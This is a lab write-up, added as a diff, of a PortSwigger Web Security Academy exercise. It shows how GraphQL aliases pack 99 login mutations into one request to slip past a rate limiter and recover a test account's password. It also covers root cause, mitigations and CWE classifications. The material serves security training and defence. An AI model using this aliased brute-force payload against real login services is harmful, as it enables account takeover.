@@ -1,0 +1,403 @@
+# PortSwigger Web Security Academy
+
+## Lab: GraphQL brute force protection bypass via aliases
+
+## Objective
+
+The objective of this lab was to bypass the application's brute-force protection and obtain valid credentials for the `carlos` account.
+
+The application implements login functionality through a GraphQL mutation and applies rate limiting to repeated authentication attempts. However, the rate-limiting mechanism can be bypassed by using GraphQL aliases to execute multiple login mutations within a single HTTP request.
+
+---
+
+# Technologies Involved
+
+* GraphQL
+* GraphQL mutations
+* GraphQL aliases
+* Burp Suite
+* HTTP/2
+* Authentication mechanisms
+* Rate limiting
+
+---
+
+# Reconnaissance
+
+The application was accessed through the Burp Suite browser and the login functionality was tested using invalid credentials.
+
+The login request was intercepted in Burp Suite and identified as a GraphQL mutation:
+
+```graphql
+mutation login($input: LoginInput!) {
+    login(input: $input) {
+        token
+        success
+    }
+}
+```
+
+The request used variables to provide the username and password:
+
+```json
+{
+  "input": {
+    "username": "wiener",
+    "password": "peter"
+  }
+}
+```
+
+The response contained two relevant fields:
+
+```graphql
+token
+success
+```
+
+The `success` field could therefore be used to determine whether a supplied credential pair was valid.
+
+---
+
+# Identification
+
+Several incorrect login attempts were submitted consecutively.
+
+After a number of failed attempts, the application started enforcing rate limiting and prevented further authentication attempts.
+
+This indicated that brute-force protection was present.
+
+However, because the application was using GraphQL, the possibility of executing multiple mutations within a single GraphQL operation was investigated.
+
+GraphQL supports aliases, which allow the same field or mutation to be requested multiple times under different names.
+
+For example:
+
+```graphql
+mutation {
+    attempt1: login(input:{username:"carlos",password:"password1"}) {
+        success
+    }
+
+    attempt2: login(input:{username:"carlos",password:"password2"}) {
+        success
+    }
+
+    attempt3: login(input:{username:"carlos",password:"password3"}) {
+        success
+    }
+}
+```
+
+Although this contains three authentication attempts, it is transmitted as a single HTTP request.
+
+This provided a potential method to bypass a rate limiter that counted HTTP requests rather than individual authentication attempts.
+
+---
+
+# Exploitation
+
+The original GraphQL login request was modified in Burp Suite Repeater.
+
+The `variables` object and `operationName` were removed and the request was converted into a direct GraphQL mutation.
+
+Multiple `login` mutations were then created using aliases.
+
+The username was set to `carlos`, while each mutation used a different password from the authentication password list.
+
+A simplified example was:
+
+```graphql
+mutation {
+    bruteforce0:login(input:{
+        username:"carlos",
+        password:"123456"
+    }) {
+        token
+        success
+    }
+
+    bruteforce1:login(input:{
+        username:"carlos",
+        password:"password"
+    }) {
+        token
+        success
+    }
+
+    bruteforce2:login(input:{
+        username:"carlos",
+        password:"qwerty"
+    }) {
+        token
+        success
+    }
+}
+```
+
+The full request contained 99 login attempts, represented by aliases from:
+
+```text
+bruteforce0
+```
+
+through:
+
+```text
+bruteforce98
+```
+
+All attempts were sent within a single HTTP request.
+
+---
+
+# Evidence
+
+The response contained the result of every individual login mutation.
+
+Most attempts returned:
+
+```json
+"success": false
+```
+
+However, one alias returned:
+
+```json
+"bruteforce60": {
+    "token": "ZO833J3tW562HRGwGxJondWIO4zGAlpk",
+    "success": true
+}
+```
+
+The successful alias was:
+
+```text
+bruteforce60
+```
+
+Mapping this alias back to the supplied password list revealed that the corresponding password was:
+
+```text
+pepper
+```
+
+Therefore, the valid credentials were:
+
+```text
+Username: carlos
+Password: pepper
+```
+
+These credentials successfully authenticated to the `carlos` account, completing the lab.
+
+---
+
+# Attack Flow
+
+The complete attack can be represented as follows:
+
+```text
+Login functionality
+        ↓
+GraphQL mutation identified
+        ↓
+Repeated failed attempts trigger rate limiting
+        ↓
+GraphQL aliases identified as a batching mechanism
+        ↓
+Multiple login mutations placed in one HTTP request
+        ↓
+Rate limiter sees only one HTTP request
+        ↓
+Multiple authentication attempts executed
+        ↓
+Response analyzed for success:true
+        ↓
+bruteforce60 = success:true
+        ↓
+Password identified as "pepper"
+        ↓
+Carlos account compromised
+```
+
+---
+
+# Root Cause
+
+The root cause was an inadequate implementation of authentication rate limiting.
+
+The application enforced restrictions at the HTTP-request level rather than at the authentication-operation level.
+
+Consequently, a single GraphQL request could contain many independent login mutations.
+
+Conceptually, the vulnerable implementation behaved like:
+
+```text
+HTTP request
+    ↓
+Rate limit check
+    ↓
+GraphQL execution
+    ├── login()
+    ├── login()
+    ├── login()
+    ├── login()
+    └── ...
+```
+
+The rate limiter therefore treated the entire GraphQL document as one request despite the document containing numerous authentication attempts.
+
+The application lacked appropriate controls to limit the number of `login` operations executed within a single GraphQL request.
+
+---
+
+# Impact
+
+An attacker could bypass the application's brute-force protection and perform a large number of password guessing attempts against a target account.
+
+Successful exploitation could result in:
+
+* Account takeover.
+* Unauthorized access to user data.
+* Exposure of authenticated functionality.
+* Further exploitation using the compromised account.
+* Potential privilege escalation if a privileged account were targeted.
+* Circumvention of conventional IP-based or request-based authentication controls.
+
+In this lab, the vulnerability resulted in the compromise of the `carlos` account.
+
+---
+
+# Mitigations
+
+## 1. Apply rate limiting at the authentication layer
+
+Rate limiting should be enforced when the `login` resolver is executed rather than only when an HTTP request is received.
+
+For example:
+
+```text
+login resolver
+      ↓
+Identify account
+      ↓
+Check authentication attempt counter
+      ↓
+Allow / delay / block
+```
+
+Every individual login attempt should contribute to the authentication-attempt counter.
+
+---
+
+## 2. Restrict GraphQL batching for authentication
+
+Authentication mutations generally should not allow unrestricted batching.
+
+The application could reject requests containing multiple `login` operations or enforce a strict limit on the number of authentication mutations per request.
+
+---
+
+## 3. Implement account-based rate limiting
+
+Rate limiting should not rely exclusively on the source IP.
+
+Controls should consider multiple identifiers, such as:
+
+* Account identifier.
+* Source IP.
+* Device/session.
+* Authentication context.
+
+This makes it significantly harder to bypass the protection through distributed requests.
+
+---
+
+## 4. Introduce progressive delays
+
+Repeated failed authentication attempts should progressively increase the response delay.
+
+For example:
+
+```text
+Attempt 1 → normal response
+Attempt 2 → short delay
+Attempt 3 → longer delay
+Attempt 4 → longer delay
+...
+```
+
+This reduces the effectiveness of automated password guessing.
+
+---
+
+## 5. Implement GraphQL complexity and operation limits
+
+GraphQL APIs should enforce appropriate query complexity and operation limits.
+
+Controls should include:
+
+* Maximum query depth.
+* Maximum query complexity.
+* Maximum number of fields.
+* Maximum number of repeated operations.
+* Restrictions on batching expensive mutations.
+
+---
+
+## 6. Use multi-factor authentication
+
+MFA should be enabled for sensitive accounts and privileged functionality.
+
+Even if an attacker discovers the correct password, an additional authentication factor can prevent account takeover.
+
+---
+
+## 7. Monitor authentication abuse
+
+The application should log and detect anomalous authentication activity, including:
+
+* Large numbers of login attempts.
+* Repeated attempts against a single account.
+* Large GraphQL documents containing repeated login mutations.
+* Multiple authentication attempts originating from the same source.
+* Unusual authentication patterns.
+
+---
+
+# Classifications
+
+### CWE-307 — Improper Restriction of Excessive Authentication Attempts
+
+The application failed to properly restrict repeated authentication attempts, allowing an attacker to perform multiple password guesses.
+
+### CWE-799 — Improper Control of Interaction Frequency
+
+The application did not properly control the frequency of authentication operations because multiple login attempts could be encapsulated within a single GraphQL request.
+
+### OWASP API Security
+
+The vulnerability is primarily related to authentication protection and insufficient controls over GraphQL operations.
+
+It can also be associated with resource-consumption controls when unrestricted GraphQL batching is permitted.
+
+---
+
+# Conclusions
+
+The application implemented brute-force protection, but the control was applied at the wrong layer.
+
+GraphQL aliases allowed multiple `login` mutations to be executed within a single HTTP request. Because the rate limiter counted HTTP requests instead of individual authentication operations, the protection could be bypassed.
+
+The attack required only a single crafted GraphQL request containing multiple aliased login mutations.
+
+The successful attempt was:
+
+```text
+Alias:    bruteforce60
+Username: carlos
+Password: pepper
+```
+
+This demonstrates an important security consideration when implementing rate limiting in GraphQL APIs: **security controls must be applied to the underlying business operation, not merely to the transport-level HTTP request.**
